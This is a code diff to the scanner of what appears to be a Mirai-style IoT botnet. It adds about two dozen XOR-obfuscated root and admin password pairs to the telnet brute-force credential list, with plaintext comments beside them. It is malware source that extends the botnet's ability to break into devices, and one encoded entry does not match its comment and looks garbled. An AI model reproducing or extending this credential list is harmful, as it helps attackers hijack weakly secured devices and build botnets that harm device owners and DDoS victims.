@@ -197,6 +197,31 @@ void scanner_init(void)
     add_auth_entry("", "", 1);                                                              // (none)   (none)
     add_auth_entry("\x4F\x43\x4B\x5C\x56\x47\x5C\x43\x5C\x41\x47", "", 1);                  // maintenance   (none)
     add_auth_entry("", "\x12\x12\x12\x12", 1);                                              // (none)   0000
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x16\x17\x13\x16", 1);                      // root     114514
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x16\x17\x13\x16", 1);                  // admin    114514
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x4E\x4D\x54\x47\x5B\x4D\x57", 1);              // root     iloveyou
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4B\x4E\x4D\x54\x47\x5B\x4D\x57", 1);          // admin    iloveyou
+    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x50\x4B\x5C\x41\x47\x51\x51", 1);              // root     princess
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x50\x4B\x5C\x41\x47\x51\x51", 1);          // admin    princess
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15", 1);                  // root     1234567
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14\x15", 1);              // admin    1234567
+    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x41\x49\x5B\x4D\x57", 1);                  // root     rockyou
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x50\x4D\x41\x49\x5B\x4D\x57", 1);              // admin    rockyou
+    add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x5B\x4D\x57", 1);                  // root     fuckyou
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x44\x57\x41\x49\x5B\x4D\x57", 1);              // admin    fuckyou
+    add_auth_entry("\x43\x46\x4F\x4B\x5C\x43\x46\x4F\x4B\x5C", "\x43\x46\x4F\x4B\x5C\x43\x46\x4F\x4B\x5C", 1); // adminadmin    adminadmin
+    add_auth_entry("\x50\x4D\x4D\x56", "\x10\x12\x12\x1A\x12\x1A\x10\x14", 1);              // root     20080826
+    add_auth_entry("\x50\x4D\x4D\x56", "\x10\x12\x13\x13\x54\x51\x56\x43", 1);              // root     2011vsta
+    add_auth_entry("\x50\x4D\x4D\x56", "\x12|No|\x1A\x15\x4E\x49\x48\x4A", 1);              // root     0987lkjh
+    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x4D\x12\x4D\x12\x4D\x12\x4D", 1);              // root     0o0o0o0o
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13", 1); // root     11111111111111111111
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13\x13\x13\x58", 1);                  // root     111111z
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13\x13\x43\x43\x43\x43\x43", 1);      // root     11111aaaaa
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x10\x11\x11\x11\x16\x16\x16\x16\x17\x17\x17\x17\x17", 1); // root     122333444455555
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x50\x4D\x4D\x56", 1);              // root     1234root
+    add_auth_entry("\x50\x4D\x4D\x56", "\x11\x12\x4F\x47\x46\x4B\x43", 1);                  // root     30media
+    add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x14\x14\x14", 1);                  // root     fuck666
+    add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x4B\x5C\x45", 1);                  // root     fucking
     
     //--------  End Add new password  ------------
 
